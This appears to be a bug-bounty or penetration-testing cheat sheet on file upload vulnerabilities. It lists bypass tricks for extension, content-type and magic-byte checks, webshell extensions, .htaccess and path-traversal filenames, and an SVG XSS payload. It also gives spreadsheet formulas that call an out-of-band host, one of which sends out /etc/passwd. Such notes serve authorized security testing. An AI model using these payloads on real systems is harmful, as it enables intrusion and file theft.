# File Upload Vulnerabilities

**TL;DR**: poorly validated upload → webshell/RCE, stored XSS, SSRF, LFI, path traversal, DoS. Always test: extension, content-type, magic bytes, storage path, web-accessibility of the file.

## Where to look
- Avatars, documents, images, imports (CSV/XML/ZIP), attachments, logos, resumes, signatures, "upload from URL" (→ SSRF).
- API upload endpoints, pre-signed URLs (S3), multipart forms.

## Map this first
- Accepted / rejected extensions (fuzz).
- Where the file is stored and under what name (random? original? predictable?).
- Is it served from a domain that executes (same-origin app) or a CDN/sandbox?
- Content-Type returned on download (XSS vs download).

## RCE via executable extension (if served by an executing server)
- PHP: `.php .php3 .php4 .php5 .phtml .pht .phar .inc`, double `shell.php.jpg`, null `shell.php%00.jpg`, case `.pHp`, trailing `.php.`/`.php `/`.php/`, `.php;.jpg`.
- ASP/.NET: `.asp .aspx .asa .cer .config` (web.config upload = classic IIS RCE), `.asmx`.
- JSP: `.jsp .jspx .jsw .jsv`.
- Config side-effect: upload `.htaccess` (redefine handler → execute `.jpg` as PHP), `web.config`.
- Server-side include: `.shtml`.

## Beating the controls
- **Extension allowlist**: double extension, null byte (old), `.jpg.php`, special/unicode chars, appended bytes.
- **Content-Type check**: set `Content-Type: image/png` in the multipart part while keeping the PHP extension/content.
- **Magic bytes / signature**: prefix with a real header (`GIF89a;<?php ...`), or payload in EXIF metadata (`exiftool -Comment='<?php ...'`).
- **Surviving GD/Imagick re-encode**: EXIF/append only survive if the server does not reprocess. If it does, hide PHP in a chunk that survives compression: PLTE chunk (beats PHP-GD), IDAT chunks, or an Imagick tEXt property. Keep a `.php` extension. Ref: Synacktiv "Persistent PHP payloads in PNGs".
- **Content sniffing**: polyglot (valid image + code).
- **Size/dimensions** (image parser): keep a valid image + appended payload.
- **Filename**: path traversal `filename="../../var/www/shell.php"`, or overwrite an existing file (`../.htaccess`, `../index.php`).

## Non-RCE vectors (often still paid)
- **Stored XSS**: upload an `.html`/`.svg` served same-origin (`<svg><script>alert(document.domain)</script>`), or SVG as avatar. Content-Type `image/svg+xml` rendered inline = XSS.
- **SVG → XXE/SSRF**: SVG with external entities → `XXE.md` / `SSRF.md`.
- **XXE via DOCX/XLSX/PPTX** (OOXML = ZIP of XML) → `XXE.md`.
- **Upload from URL** → SSRF.
- **CSV/formula injection**: `=cmd|...`, `@`, `+`, `-` at cell start → execution when the victim opens in Excel.
- **XLSX/spreadsheet OOB + file read**: `=HYPERLINK("//x.oastify.com")`, `=WEBSERVICE("http://x.oastify.com")` (SSRF/OOB when opened server-side or by staff), `=WEBSERVICE(CONCATENATE("http://x.oastify.com";('file:///etc/passwd'#$passwd.A1)))` to exfil a local file.
- **Malicious PDF**: `malicious-pdf.py <collaborator>` builds a PDF that calls home (blind SSRF/interaction when parsed server-side or opened by staff).
- **Zip Slip** (extraction) → write path traversal.
- **ImageMagick/ffmpeg** parsing → RCE/SSRF/LFI (see `COMMAND_INJECTION.md`).
- **Pixel flood / decompression bomb** → DoS (often out of scope).
- **Overwrite** of critical files via controlled name.

## Find the uploaded file URL (to trigger)
- Upload response (`url`, `path`, `id`), predictable pattern, listing, Wayback, increment.

## Impact
- Webshell/RCE = Critical. Same-origin stored XSS = High. XXE/SSRF per pivot.

## Caido
- Intercept the multipart request; modify filename/Content-Type/magic bytes in Replay; Automate over the extension list (SecLists `web-extensions.txt`).

## References
- PortSwigger - File upload vulnerabilities - https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings - Upload Insecure Files - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- OWASP - File Upload Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP WSTG - Testing Upload of Malicious Files - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
- HackTricks - File Upload - https://book.hacktricks.wiki/en/pentesting-web/file-upload/
